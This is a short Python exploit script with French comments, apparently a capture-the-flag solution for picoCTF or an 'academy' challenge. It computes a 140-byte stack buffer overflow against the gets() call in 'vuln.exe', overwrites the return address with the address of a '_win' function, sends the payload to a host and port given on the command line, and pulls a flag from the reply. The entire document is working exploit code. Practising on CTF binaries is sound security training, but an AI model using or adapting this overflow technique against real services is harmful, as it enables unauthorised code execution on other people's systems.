import socket, re, struct, sys, time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = sys.argv[1], int(sys.argv[2])

# vuln.exe : vuln() -> char buf[128] a ebp-0x88 ; gets() sans borne.
# EIP est a ebp+4  => offset = 0x88 + 4 = 140 ; _win = 0x40151c
WIN = 0x40151C
OFF = 0x88 + 4

payload = b"A" * OFF + struct.pack("<I", WIN)
print("payload:", len(payload), "octets ; WIN =", hex(WIN))

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(6)
time.sleep(0.5)
banner = b""
try:
    banner = s.recv(4096)
except Exception:
    pass
print("banner:", banner[:200])
s.sendall(payload + b"\n")
time.sleep(1.0)
out = b""
t0 = time.time()
while time.time() - t0 < 10:
    try:
        d = s.recv(4096)
    except socket.timeout:
        break
    except Exception:
        break
    if not d:
        break
    out += d
s.close()
txt = out.decode("latin-1", "replace")
print("=== sortie ===")
print(txt[:2000])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", m.group(0) if m else None)
